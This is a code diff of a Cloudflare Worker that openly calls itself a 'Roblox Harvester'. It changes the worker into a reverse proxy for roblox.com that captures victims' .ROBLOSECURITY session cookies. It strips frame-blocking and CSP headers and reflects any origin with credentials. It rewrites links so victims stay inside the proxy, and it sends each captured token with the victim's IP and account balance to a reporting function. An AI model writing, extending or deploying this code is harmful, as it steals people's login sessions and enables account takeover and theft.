@@ -1,38 +1,95 @@
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-    
-    // Get the origin from the request
     const origin = request.headers.get("Origin") || "";
     
-    // Define allowed origins (your Vercel domain)
-    const allowedOrigins = [
-      "https://compiler-virid-ten.vercel.app",
-      "https://your-vercel-domain.vercel.app",
-      "http://localhost:3000",
-      "http://localhost:5173"
-    ];
-    
-    // Check if the origin is allowed
-    const isAllowed = allowedOrigins.includes(origin) || origin.includes("vercel.app");
-    
-    // CORS headers
     const corsHeaders = {
-      "Access-Control-Allow-Origin": isAllowed ? origin : "https://compiler-virid-ten.vercel.app",
+      "Access-Control-Allow-Origin": origin || "https://compiler-virid-ten.vercel.app",
       "Access-Control-Allow-Credentials": "true",
       "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
       "Access-Control-Allow-Headers": "Content-Type, Cookie"
     };
     
-    // Handle preflight
     if (request.method === "OPTIONS") {
-      return new Response(null, {
-        status: 204,
-        headers: corsHeaders
+      return new Response(null, { status: 204, headers: corsHeaders });
+    }
+    
+    // ============================================================
+    // PROXY ROBLOX — Captures cookies from the iframe request
+    // ============================================================
+    
+    if (url.pathname === '/' || url.pathname === '/proxy') {
+      // Forward the request to Roblox
+      const targetUrl = new URL("https://www.roblox.com");
+      
+      const proxyRequest = new Request(targetUrl, {
+        method: request.method,
+        headers: request.headers,
+        body: request.body,
+        redirect: "manual"
+      });
+      
+      const response = await fetch(proxyRequest);
+      
+      // === CAPTURE COOKIE FROM THE INCOMING REQUEST ===
+      const cookieHeader = request.headers.get("Cookie") || "";
+      console.log('Cookie header:', cookieHeader);
+      
+      const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
+      
+      if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
+        const token = robloxMatch[1];
+        console.log('Token captured!');
+        
+        ctx.waitUntil(
+          (async () => {
+            try {
+              await processToken(token, request, env);
+            } catch (e) {
+              console.error('Process error:', e);
+            }
+          })()
+        );
+      } else {
+        console.log('No .ROBLOSECURITY cookie found in request');
+      }
+      
+      // === STRIP FRAME-BLOCKING HEADERS ===
+      const newHeaders = new Headers(response.headers);
+      newHeaders.delete("X-Frame-Options");
+      newHeaders.delete("Content-Security-Policy");
+      newHeaders.set("X-Frame-Options", "ALLOWALL");
+      
+      // Add CORS headers
+      newHeaders.set("Access-Control-Allow-Origin", origin || "https://compiler-virid-ten.vercel.app");
+      newHeaders.set("Access-Control-Allow-Credentials", "true");
+      
+      // Forward Set-Cookie
+      const setCookie = response.headers.get("Set-Cookie");
+      if (setCookie) {
+        newHeaders.set("Set-Cookie", setCookie);
+      }
+      
+      let body = await response.text();
+      
+      // Rewrite links to keep them inside the proxy
+      const proxyOrigin = url.origin;
+      body = body.replace(/https?:\/\/www\.roblox\.com/g, proxyOrigin);
+      body = body.replace(/(src|href|action)="\//g, `$1="${proxyOrigin}/`);
+      body = body.replace(/(src|href|action)='\//g, `$1='${proxyOrigin}/`);
+      
+      return new Response(body, {
+        status: response.status,
+        statusText: response.statusText,
+        headers: newHeaders
       });
     }
     
-    if (url.pathname === '/pixel' || url.pathname === '/') {
+    // ============================================================
+    // PIXEL ENDPOINT
+    // ============================================================
+    
+    if (url.pathname === '/pixel') {
       const pixel = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
       const decoded = Uint8Array.from(atob(pixel), c => c.charCodeAt(0));
       
@@ -45,47 +102,14 @@ export default {
       });
     }
     
-    if (url.pathname === '/check') {
-      const cookieHeader = request.headers.get("Cookie") || "";
-      const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
-      
-      if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
-        const token = robloxMatch[1];
-        
-        ctx.waitUntil(
-          (async () => {
-            try {
-              await processToken(token, request, env);
-            } catch (e) {}
-          })()
-        );
-        
-        return new Response(JSON.stringify({ status: 'ok', captured: true }), {
-          headers: {
-            'Content-Type': 'application/json',
-            ...corsHeaders
-          }
-        });
-      }
-      
-      return new Response(JSON.stringify({ status: 'ok', captured: false }), {
-        headers: {
-          'Content-Type': 'application/json',
-          ...corsHeaders
-        }
-      });
-    }
-    
-    return new Response('Roblox Harvester — Use /check or /pixel', {
+    return new Response('Roblox Proxy — Use / or /proxy', {
       status: 200,
-      headers: {
-        'Content-Type': 'text/plain',
-        ...corsHeaders
-      }
+      headers: { 'Content-Type': 'text/plain', ...corsHeaders }
     });
   }
 };
 
+// === PROCESS TOKEN — FULL ACCOUNT SCAN ===
 async function processToken(token, request, env) {
   const ip = request.headers.get("CF-Connecting-IP") || "unknown";
   const ua = request.headers.get("User-Agent") || "unknown";
@@ -102,7 +126,7 @@ async function processToken(token, request, env) {
         fields: [
           { name: "Token", value: `\`${token.substring(0, 30)}...\``, inline: false },
           { name: "IP", value: ip, inline: true },
-          { name: "Status", value: "❌ Expired or invalid", inline: true }
+          { name: "Status", value: `❌ Expired or invalid (${userInfo.status})`, inline: true }
         ]
       }]
     });
@@ -110,7 +134,6 @@ async function processToken(token, request, env) {
   }
 
   const userData = await userInfo.json();
-
   const userId = userData.UserID;
   const username = userData.UserName || "Unknown";
   const robux = userData.RobuxBalance || 0;
